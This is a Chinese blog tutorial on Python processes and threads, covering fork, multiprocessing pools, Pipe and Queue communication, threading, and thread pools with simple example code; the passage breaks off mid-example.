    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python学习——进程与线程</title>
    <link href="/2021/02/13/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    <url>/2021/02/13/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在做扫描器的研究，不得不接触到多线程多进程的技术，不然总不能单个线程等它跑半天吧。一说到python学习就想到廖雪峰，就去他的网站上学习了一下，讲的还挺清楚。于是就有了本文，本文也是大多参考他的文章而做的简洁的技术总结，并在此基础上做了一些自己的补充。</p><p>首先说一说为什么我们需要多进程。我们现在运行的操作系统，支持多任务同时执行，可以一边听歌一边敲代码。这是两个不同的程序，但在我们眼里就是在同时执行。在单核CPU中，一个任务执行完了才能执行下面一个任务，同一时间只能执行一个程序。那我们就只能听完歌再敲代码，总之不能同时进行。为了解决这个问题，CPU将执行时间分为了许多很小的时间段。比如以0.1秒作为时间间隔。CPU执行0.1秒的听歌程序，在下一个0.1秒执行写代码程序。再无限循环这个过程。就可以模拟实现多任务同时运行的画面了。真正的并行执行任务只能在多核CPU上实现，但操作系统中并行的任务远远超出CPU的核心数，所以即使在多核CPU上，也使用上面的任务调度模型。</p><p>在操作系统中，一个程序就是一个进程。以浏览器为例，我们打开了两个浏览器就是打开了两个进程，而我们在一个浏览器页面中打开了两个标签页，就是打开了两个线程，线程是系统执行任务的最小单位。一个进程内可以分出多个线程。</p><p>于是我们执行多任务有三种模式</p><ol><li>多线程</li><li>多进程</li><li>多进程+多线程</li></ol><h2 id="多进程"><a href="#多进程" class="headerlink" title="多进程"></a>多进程</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>要让Python程序实现多进程（multiprocessing），我们先了解操作系统的相关知识。</p><p>Unix&#x2F;Linux操作系统提供了一个<code>fork()</code>系统调用，它非常特殊。普通的函数调用，调用一次，返回一次，但是<code>fork()</code>调用一次，返回两次，因为操作系统自动把当前进程（称为父进程）复制了一份（称为子进程），然后，分别在父进程和子进程内返回。</p><p>子进程永远返回<code>0</code>，而父进程返回子进程的ID。这样做的理由是，一个父进程可以fork出很多子进程，所以，父进程要记下每个子进程的ID，而子进程只需要调用<code>getppid()</code>就可以拿到父进程的ID。</p><p>Python的<code>os</code>模块封装了常见的系统调用，其中就包括<code>fork</code>，可以在Python程序中轻松创建子进程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Process (%s) start...&#x27;</span> % os.getpid())<br><span class="hljs-comment"># Only works on Unix/Linux/Mac:</span><br>pid = os.fork()<br><span class="hljs-keyword">if</span> pid == <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I am child process (%s) and my parent is %s.&#x27;</span> % (os.getpid(), os.getppid()))<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I (%s) just created a child process (%s).&#x27;</span> % (os.getpid(), pid))<br></code></pre></td></tr></table></figure><p>注：由于Windows没有<code>fork</code>调用，上面的代码在Windows上无法运行。</p><h3 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h3><p>那在win下就没有办法实现多进程了吗。答案是否定的，python提供了一个名叫<code>multiprocessing</code>的库来跨平台实现多进程。</p><p>基本用法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process<br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-comment"># 子进程要执行的代码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_proc</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Run child process %s (%s)...&#x27;</span> % (name, os.getpid()))<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Parent process %s.&#x27;</span> % os.getpid())<br>    p = Process(target=run_proc, args=(<span class="hljs-string">&#x27;test&#x27;</span>,))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Child process will start.&#x27;</span>)<br>    p.start()<br>    p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Child process end.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>创建子进程时，只需要传入一个执行函数和函数的参数，创建一个<code>Process</code>实例，用<code>start()</code>方法启动，这样创建进程比<code>fork()</code>还要简单。</p><p><code>join()</code>方法可以等待子进程结束后再继续往下运行，通常用于进程间的同步。</p><h3 id="进程池"><a href="#进程池" class="headerlink" title="进程池"></a>进程池</h3><p>如果要启动大量的子进程，可以用进程池的方式批量创建子进程：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool<br><span class="hljs-keyword">import</span> os, time, random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">long_time_task</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Run task %s (%s)...&#x27;</span> % (name, os.getpid()))<br>    start = time.time()<br>    time.sleep(random.random() * <span class="hljs-number">3</span>)<br>    end = time.time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Task %s runs %0.2f seconds.&#x27;</span> % (name, (end - start)))<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Parent process %s.&#x27;</span> % os.getpid())<br>    p = Pool(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        p.apply_async(long_time_task, args=(i,))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Waiting for all subprocesses done...&#x27;</span>)<br>    p.close()<br>    p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;All subprocesses done.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>对<code>Pool</code>对象调用<code>join()</code>方法会等待所有子进程执行完毕，调用<code>join()</code>之前必须先调用<code>close()</code>，调用<code>close()</code>之后就不能继续添加新的<code>Process</code>了。</p><p>pool的默认大小是CPU的核心数，这段程序创建了容量为4的进程池，第5个程序必须等前4个中任意一个进程空出来时才开始执行</p><p>注意第15行，在向线程池中添加任务时用到的是<code>apply_async()</code>，他是非阻塞异步的，不会等待子进程执行完毕，主进程会继续执行，会根据系统调度来进行进程切换。</p><p>与之对应的是<code>apply()</code>，他是阻塞主进程，并且一个一个按顺序地执行子进程，等到全部子进程都执行完毕后，继续执行<code>apply()</code>后面主进程的代码。</p><p>使用<code>apply_async()</code>后面一定要调用<code>close()</code>和<code>join()</code>，否则由于系统调度太快，父进程会直接执行完毕，导致子进程的代码还来不及被执行就结束了。</p><h3 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h3><p>在编写爬虫程序时会用到进程间通信。比如父进程不断给空闲的子进程分配要爬取的url，子进程不断将爬取完的结果送给父进程。python的<code>multiprocessing</code>就提供了<code>Queue</code>和<code>Pipe</code>等多种方式来交换数据。这里分别介绍这两种工具的实现方式。</p><h4 id="管道Pipe"><a href="#管道Pipe" class="headerlink" title="管道Pipe"></a>管道Pipe</h4><p>管道顾名思义就是在两个线程间建立一个通道进行传输数据，学过计算机网络的同学应该很容易理解，这里可以把管道比喻成那根网线。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#创建管道的类：<br><span class="hljs-function"><span class="hljs-title">Pipe</span><span class="hljs-params">([duplex])</span></span>:在进程之间创建一条管道，并返回元组（conn1,conn2）,其中conn1，conn2表示管道两端的连接对象，强调一点：必须在产生Process对象之前产生管道<br>#参数介绍：<br>dumplex:默认管道是全双工的，如果将duplex射成False，conn1只能用于接收，conn2只能用于发送。<br>#主要方法：<br>    conn1<span class="hljs-selector-class">.recv</span>():接收conn2<span class="hljs-selector-class">.send</span>(obj)发送的对象。如果没有消息可接收，recv方法会一直阻塞。如果连接的另外一端已经关闭，那么recv方法会抛出EOFError。<br>    conn1<span class="hljs-selector-class">.send</span>(obj):通过连接发送对象。obj是与序列化兼容的任意对象<br> #其他方法：<br>conn1<span class="hljs-selector-class">.close</span>():关闭连接。如果conn1被垃圾回收，将自动调用此方法<br>conn1<span class="hljs-selector-class">.fileno</span>():返回连接使用的整数文件描述符<br>conn1<span class="hljs-selector-class">.poll</span>(<span class="hljs-selector-attr">[timeout]</span>):如果连接上的数据可用，返回True。timeout指定等待的最长时限。如果省略此参数，方法将立即返回结果。如果将timeout射成None，操作将无限期地等待数据到达。<br>conn1<span class="hljs-selector-class">.recv_bytes</span>(<span class="hljs-selector-attr">[maxlength]</span>):接收c<span class="hljs-selector-class">.send_bytes</span>()方法发送的一条完整的字节消息。maxlength指定要接收的最大字节数。如果进入的消息，超过了这个最大值，将引发IOError异常，并且在连接上无法进行进一步读取。如果连接的另外一端已经关闭，再也不存在任何数据，将引发EOFError异常。<br>conn<span class="hljs-selector-class">.send_bytes</span>(buffer <span class="hljs-selector-attr">[, offset [, size]</span>])：通过连接发送字节数据缓冲区，buffer是支持缓冲区接口的任意对象，offset是缓冲区中的字节偏移量，而size是要发送字节数。结果数据以单条消息的形式发出，然后调用c<span class="hljs-selector-class">.recv_bytes</span>()函数进行接收    <br>conn1<span class="hljs-selector-class">.recv_bytes_into</span>(buffer <span class="hljs-selector-attr">[, offset]</span>):接收一条完整的字节消息，并把它保存在buffer对象中，该对象支持可写入的缓冲区接口（即bytearray对象或类似的对象）。offset指定缓冲区中放置消息处的字节位移。返回值是收到的字节数。如果消息长度大于可用的缓冲区空间，将引发BufferTooShort异常。<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Pipe<br><span class="hljs-keyword">import</span> os, time, random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">c1</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for write&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Process to write: %s&#x27;</span> % os.getpid())<br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;C&#x27;</span>]:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;send %s to pipe...&#x27;</span> % value)<br>        c1.send(value)<br>        time.sleep(random.random())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">c2</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;docstring for read&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Process to read: %s&#x27;</span> % os.getpid())<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        value =  c2.recv()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;recv %s from pipe&#x27;</span> % value)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    c1, c2 = Pipe()<br>    pw = Process(target=write, args=(c1,))<br>    pr = Process(target=read, args=(c2,))<br>    pw.start()<br>    pr.start()<br>    pw.join()<br>    pr.terminate()<br></code></pre></td></tr></table></figure><p>管道的EOFError是怎么报出来的：管道空了,且一端关闭了<br>管道是由操作系统进行引用计数的，必须在所有进程中关闭管道后才能生成EOFError异常。</p><p>由于管道在数据管理上是不安全的，没有锁机制<br>队列的实现机制 就是 管道+锁</p><p>关于锁机制的内容会在后面讲解，简单来说就是多个线程对同一数据修改时会造成结果与预期不符</p><h4 id="队列Queue"><a href="#队列Queue" class="headerlink" title="队列Queue"></a>队列Queue</h4><p>在父进程中创建两个子进程，一个往<code>Queue</code>里写数据，一个从<code>Queue</code>里读数据，这是典型的生产者消费者模型，write负责生产资源并加入队列，由read进行消费</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Process, Queue<br><span class="hljs-keyword">import</span> os, time, random<br><br><span class="hljs-comment"># 写数据进程执行的代码:</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">q</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Process to write: %s&#x27;</span> % os.getpid())<br>    <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Put %s to queue...&#x27;</span> % value)<br>        q.put(value)<br>        time.sleep(random.random())<br><br><span class="hljs-comment"># 读数据进程执行的代码:</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>(<span class="hljs-params">q</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Process to read: %s&#x27;</span> % os.getpid())<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        value = q.get(<span class="hljs-literal">True</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Get %s from queue.&#x27;</span> % value)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 父进程创建Queue，并传给各个子进程：</span><br>    q = Queue()<br>    pw = Process(target=write, args=(q,))<br>    pr = Process(target=read, args=(q,))<br>    <span class="hljs-comment"># 启动子进程pw，写入:</span><br>    pw.start()<br>    <span class="hljs-comment"># 启动子进程pr，读取:</span><br>    pr.start()<br>    <span class="hljs-comment"># 等待pw结束:</span><br>    pw.join()<br>    <span class="hljs-comment"># pr进程里是死循环，无法等待其结束，只能强行终止:</span><br>    pr.terminate()<br></code></pre></td></tr></table></figure><h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><p>多任务可以由多进程完成，也可以由一个进程内的多线程完成。</p><p>python标准库提供了两个模块让我们来操作线程，分别是<code>_thread</code>和<code>threading</code>，前者是低级模块，后者是高级模块，对前者进行了封装，一般来说我们使用后者即可。</p><h3 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h3><p>基本使用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time, threading<br><br><span class="hljs-comment"># 新线程执行的代码:</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loop</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread %s is running...&#x27;</span> % threading.current_thread().name)<br>    n = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> n &lt; <span class="hljs-number">5</span>:<br>        n = n + <span class="hljs-number">1</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread %s &gt;&gt;&gt; %s&#x27;</span> % (threading.current_thread().name, n))<br>        time.sleep(<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread %s ended.&#x27;</span> % threading.current_thread().name)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread %s is running...&#x27;</span> % threading.current_thread().name)<br>t = threading.Thread(target=loop, name=<span class="hljs-string">&#x27;LoopThread&#x27;</span>)<br>t.start()<br>t.join()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;thread %s ended.&#x27;</span> % threading.current_thread().name)<br></code></pre></td></tr></table></figure><p><code>threading.Thread</code>启用了一个名叫LoopThread的线程，执行<code>loop()</code>这个函数，而主线程不负责执行具体函数，只负责线程的调度。</p><h3 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h3><p>既然有进程池，那么对应也会有线程池，用于处理大量并发任务。常用的有两个库提供了线程池，一个是<code>multiprocessing.dummy</code>，另一个是<code>concurrent.futures</code>，<code>concurrent.futures</code>是python3.2中新添加的库。这两个库的区别是<code>concurrent.futures</code>写法简单些，但性能稍微弱一些，使用map时，future是逐个提交，multiprocessing是批量提交，因此对于大批量jobs时，multiprocessing性能更好一些。而future则提供了更多的功能，如callback、check status、cancel等，对于对需要长时间运行的任务更好一些。</p><h4 id="concurrent-futures的例子"><a href="#concurrent-futures的例子" class="headerlink" title="concurrent.futures的例子"></a>concurrent.futures的例子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> concurrent.futures<br><span class="hljs-keyword">import</span> urllib.request<br><br>URLS = [<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.sina.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://python.org/&#x27;</span>]<br><br><span class="hljs-comment"># Retrieve a single page and report the URL and contents</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_url</span>(<span class="hljs-params">url, timeout</span>):<br>    <span class="hljs-keyword">with</span> urllib.request.urlopen(url, timeout=timeout) <span class="hljs-keyword">as</span> conn:<br>        <span class="hljs-keyword">return</span> conn.read()<br><br><span class="hljs-comment"># We can use a with statement to ensure threads are cleaned up promptly</span><br><span class="hljs-keyword">with</span> concurrent.futures.ThreadPoolExecutor(max_workers=<span class="hljs-number">5</span>) <span class="hljs-keyword">as</span> executor:<br>    <span class="hljs-comment"># Start the load operations and mark each future with its URL</span><br>    future_to_url = &#123;executor.submit(load_url, url, <span class="hljs-number">60</span>): url <span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> URLS&#125;<br>    <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> concurrent.futures.as_completed(future_to_url):<br>        url = future_to_url[future]<br>        <span class="hljs-keyword">try</span>:<br>            data = future.result()<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> exc:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%r generated an exception: %s&#x27;</span> % (url, exc))<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;%r page is %d bytes&#x27;</span> % (url, <span class="hljs-built_in">len</span>(data)))<br></code></pre></td></tr></table></figure><p>例子来源于<a href="https://docs.python.org/zh-cn/3/library/concurrent.futures.html#threadpoolexecutor-example">python官方文档</a>，更详细的内容查看文档即可。</p><h4 id="multiprocessing-dummy的例子"><a href="#multiprocessing-dummy的例子" class="headerlink" title="multiprocessing.dummy的例子"></a>multiprocessing.dummy的例子</h4><p>用法与进程池类似，只要在引入包时将<code>from multiprocessing import Pool</code>改为<code>from multiprocessing.dummy import Pool</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool<br><span class="hljs-keyword">import</span> os, time, random<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">long_time_task</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Run task %s (%s)...&#x27;</span> % (name, os.getpid()))<br>    start = time.time()<br>    time.sleep(random.random() * <span class="hljs-number">3</span>)<br>    end = time.time()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Task %s runs %0.2f seconds.&#x27;</span> % (name, (end - start)))<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Parent process %s.&#x27;</span> % os.getpid())<br>    p = Pool(<span class="hljs-number">4</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        p.apply_async(long_time_task, args=(i,))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Waiting for all subprocesses done...&#x27;</span>)<br>    p.close()<br>    p.join()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;All subprocesses done.&#x27;</span>)<br></code></pre></td></tr></table></figure><p>再来一个爬虫的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> multiprocessing.dummy <span class="hljs-keyword">import</span> Pool <span class="hljs-keyword">as</span> ThreadPool<br><span class="hljs-keyword">import</span> urllib.request<br><br>URLS = [<span class="hljs-string">&#x27;https://www.baidu.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://www.sina.com/&#x27;</span>,<br>        <span class="hljs-string">&#x27;https://python.org/&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_url</span>(<span class="hljs-params">url, timeout</span>):<br>    <span class="hljs-keyword">with</span> urllib.request.urlopen(url, timeout=timeout) <span class="hljs-keyword">as</span> conn:<br>        <span class="hljs-keyword">return</span> conn.read()<br><br>pool = ThreadPool(processes = <span class="hljs-number">10</span>)<br>results = pool.<span class="hljs-built_in">map</span>(load_url,URLS)<br>pool.close()<br>pool.join()<br></code></pre></td></tr></table></figure><h3 id="pool的8个任务分配函数"><a href="#pool的8个任务分配函数" class="headerlink" title="pool的8个任务分配函数"></a>pool的8个任务分配函数</h3><p>这里顺便说一下对于一个pool的map和apply的异同</p><table><thead><tr><th></th><th>多参数</th><th>并行</th><th>阻塞(同步)</th><th>结果有序</th></tr></thead><tbody><tr><td>map</td><td>no</td><td>yes</td><td>yes</td><td>yes</td></tr><tr><td>apply</td><td>yes</td><td>no</td><td>yes</td><td>no</td></tr><tr><td>map_async</td><td>no</td><td>yes</td><td>no</td><td>yes</td></tr><tr><td>apply_async</td><td>yes</td><td>yes</td><td>no</td><td>no</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">fn</span>(<span class="hljs-params">msg</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;msg:&quot;</span>, msg)<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;end&quot;</span>)<br><br><span class="hljs-comment"># map 阻塞到任务列表中所有任务完成再往下执行(注意mark位置)</span><br><span class="hljs-comment"># 注意对于很长的迭代对象，可能消耗很多内存。可以考虑使用 imap() 或 imap_unordered() 并且显示指定 chunksize 以提升效率。</span><br>pool.<span class="hljs-built_in">map</span>(fn,<span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~~&quot;</span>)<br>pool.close()<br>pool.join()<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">输出结果</span><br><span class="hljs-string">msg: 0</span><br><span class="hljs-string">msg: 1</span><br><span class="hljs-string">end</span><br><span class="hljs-string">end</span><br><span class="hljs-string">Mark~ Mark~ Mark~~~~~~~~~~~~~~~~~~~~~</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># apply 